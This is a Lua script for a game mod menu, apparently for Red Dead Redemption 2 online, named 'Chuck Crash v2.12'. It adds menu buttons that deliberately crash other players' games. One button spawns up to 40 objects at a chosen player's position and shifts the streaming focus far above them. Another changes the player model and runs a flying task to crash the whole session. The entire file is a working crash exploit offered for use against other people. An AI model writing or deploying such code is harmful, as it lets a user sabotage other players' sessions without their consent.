system.setScriptName("~e~Chuck ~e~CrashV2.12")

system.registerConstructor(function()
    logger.logInfo("--==============================--")
    logger.logInfo("--           Chuck Crash        --")
    logger.logInfo("--           v2.12 By XEX       --")
    logger.logInfo("--==============================--")
    logger.logInfo("Chuck Crash ready, use from the players tab.")
end)

-- Model hashes
local hash_model = 0x0FD92BD2 -- "p_test_tinthorse"

-- Menu
local crash_id = menu.addSubmenu('player', 'Crashes', 'Chuck Crash')
local session_id = menu.addSubmenu('network', 'Crashes', '')

--Session Crash
local function bird_crash()
    utility.changePlayerModel(0x6A640A7B)
    system.yield(200)
    local local_player = player.getLocalPed()
    natives.task_taskFlyToCoord(local_player, 0, 0, 0, 0, 0, 0)
    system.yield(1800)
    utility.changePlayerModel(0xF5C1611E)
end

-- Tables for tracking spawned objects
local spawnedObjects = {}
local spawnTimes = {}
local deleteDelay = 5000 -- milliseconds before objects are deleted

-- Spinner to control how many objects to spawn
menu.addIntSpinner(
    crash_id,                         -- Submenu
    'Number of Chuck Objects',        -- Title
    'Choose how many objects to spawn (1-40)', -- Help text
    1,                                -- Min
    40,                               -- Max
    1,                                -- Increment
    1,                                -- Default value
    function(value, playerIdx)        -- Callback when value changes
        numChuckObjects = value
        logger.logInfo('Number of Chuck Objects set to ' .. numChuckObjects)
    end
)

-- Tick to auto-delete spawned objects
system.registerTick(function(frame)
    local currentTick = system.getTickCount64()

    for i = #spawnedObjects, 1, -1 do
        local obj = spawnedObjects[i]

        -- store spawn time if not already stored
        if not spawnTimes[obj] then
            spawnTimes[obj] = currentTick
        end

        -- delete object after delay
        if currentTick - spawnTimes[obj] > deleteDelay then
            if natives.entity_doesEntityExist(obj) then
                spawner.deleteObject(obj)
            end
            table.remove(spawnedObjects, i)
            spawnTimes[obj] = nil
        end
    end
end)

-- Model loading function
local function loadModel()
    natives.streaming_requestModel(hash_model, true)
    if natives.streaming_isModelValid(hash_model) then
        logger.logInfo(hash_model .. " model is valid")
    else
        logger.logError(hash_model .. " model is not valid!")
        return false
    end
    while not natives.streaming_hasModelLoaded(hash_model) do
        system.yield(100)
    end
end

-- Chuck Crash function
local function chuck_crash(player_idx)
    loadModel(hash_model)
    local player_name = player.getName(player_idx)
    local target_x, target_y, target_z = player.getCoords(player_idx)

    for i = 1, numChuckObjects do
        local focus_zone_z = target_z + 10000
        local focus_object = spawner.spawnObject(hash_model, target_x, target_y, focus_zone_z)
        natives.streaming_setFocusEntity(focus_object)
        table.insert(spawnedObjects, focus_object)

        local wagon_object = spawner.spawnObject(natives.misc_getHashKey("s_chuckwagonawning01b"), target_x, target_y, target_z)
        table.insert(spawnedObjects, wagon_object)
    end

    logger.logInfo('Chuck Crash Sent to ' .. player_name)
end

-- Menu button to trigger the crash
menu.addButton(crash_id, 'Chuck Crash ~e~ [AOE]', '', chuck_crash)
menu.addButton(session_id, 'Bird Crash', 'Crashes the session', bird_crash)